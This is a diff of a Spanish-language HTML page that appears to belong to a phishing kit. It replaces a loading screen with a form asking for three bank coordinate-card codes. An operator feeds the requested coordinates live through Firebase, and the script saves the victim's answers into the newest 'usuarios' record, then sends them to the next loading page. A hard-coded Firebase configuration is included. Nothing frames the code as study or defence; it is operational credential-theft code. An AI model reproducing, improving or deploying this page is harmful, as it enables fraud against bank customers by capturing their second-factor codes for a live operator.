@@ -1,35 +1,16 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8" />
-  <title>Cargando...</title>
+  <meta charset="UTF-8">
+  <title>Ingresar Coordenadas</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      background-color: white;
-    }
-    .loader {
-      font-size: 20px;
-      color: #333;
-    }
+    body { font-family: sans-serif; padding: 20px; text-align: center; }
+    input.coord { width: 40px; margin: 10px; text-align: center; font-size: 24px; }
+    .label-coord { font-size: 18px; display: inline-block; width: 60px; }
+    #cargando { font-size: 22px; color: red; }
   </style>
-</head>
-<body>
-  <div class="loader">Cargando datos...</div>
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js">
-    setTimeout(() => {
-      window.location.href = "expirada.html";
-    }, 300000); // 5 minutos
-</script>
-  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js">
-    setTimeout(() => {
-      window.location.href = "expirada.html";
-    }, 300000); // 5 minutos
-</script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
   <script>
     const firebaseConfig = {
       apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
@@ -41,22 +22,67 @@
       appId: "1:604053438195:web:188de91bee9a62f0d3c186"
     };
     firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
-    const ref = db.ref("validacion_estado");
-    ref.on("value", snap => {
-      const val = snap.val();
-      if (val === "siguiente") {
-        ref.set("");  // limpiar estado
-        window.location.href = "cargando3.html";
-      } else if (val === "error") {
-        ref.set("");
-        window.location.href = "error.html";
-      }
-    });
-  
-    setTimeout(() => {
-      window.location.href = "expirada.html";
-    }, 300000); // 5 minutos
-</script>
+
+    function cargar() {
+      document.getElementById("formulario").style.display = "none";
+      firebase.database().ref("validacion_estado").on("value", snap => {
+        if (snap.val() === "siguiente") {
+          document.getElementById("cargando").style.display = "none";
+          document.getElementById("formulario").style.display = "block";
+        }
+      });
+
+      firebase.database().ref("coordenadas_temporales").on("value", snap => {
+        const data = snap.val();
+        if (data) {
+          document.getElementById("label1").innerText = data.c1 || "";
+          document.getElementById("label2").innerText = data.c2 || "";
+          document.getElementById("label3").innerText = data.c3 || "";
+        }
+      });
+    }
+
+    function enviarCoordenadas(e) {
+      e.preventDefault();
+      const v1 = document.getElementById("c1").value;
+      const v2 = document.getElementById("c2").value;
+      const v3 = document.getElementById("c3").value;
+      const coordCompleta = v1 + "-" + v2 + "-" + v3;
+      const timestamp = new Date().toLocaleString("es-CL");
+
+      firebase.database().ref("usuarios").limitToLast(1).once("value").then(snap => {
+        const key = Object.keys(snap.val())[0];
+        firebase.database().ref("usuarios/" + key).update({
+          coordenadas: coordCompleta,
+          timestamp: timestamp
+        }).then(() => {
+          firebase.database().ref("validacion_estado").set(""); // limpiar estado
+          window.location.href = "cargando2.html";
+        });
+      });
+    }
+
+    window.onload = cargar;
+  </script>
+</head>
+<body>
+  <div id="cargando">Cargando datos...</div>
+
+  <form id="formulario" style="display:none;" onsubmit="enviarCoordenadas(event)">
+    <h2>Ingresa las coordenadas solicitadas</h2>
+    <div>
+      <span class="label-coord" id="label1">A1</span>
+      <input id="c1" maxlength="2" class="coord" required />
+    </div>
+    <div>
+      <span class="label-coord" id="label2">B2</span>
+      <input id="c2" maxlength="2" class="coord" required />
+    </div>
+    <div>
+      <span class="label-coord" id="label3">C3</span>
+      <input id="c3" maxlength="2" class="coord" required />
+    </div>
+    <button type="submit">Enviar</button>
+  </form>
 </body>
 </html>
